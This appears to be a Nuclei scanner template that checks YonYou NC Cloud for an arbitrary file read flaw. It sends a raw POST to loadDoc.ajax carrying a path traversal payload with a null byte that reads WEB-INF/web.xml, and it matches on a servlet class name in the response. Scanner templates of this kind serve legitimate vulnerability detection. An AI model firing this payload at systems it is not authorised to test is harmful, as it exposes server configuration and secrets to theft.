id: YonYouNC-Cloud-loadDoc-ReadAnyFile

info:
  name: YonYouNC-Cloud-loadDoc-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    YonYouNC-Cloud-loadDoc-ReadAnyFile.

http:
  - raw:
      - |
        POST /uapws/loadDoc.ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ws=../../WEB-INF/web.xml%00

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - nc.bs.framework.server.LoggerServletFilter
        condition: and

      - type: status
        status:
          - 200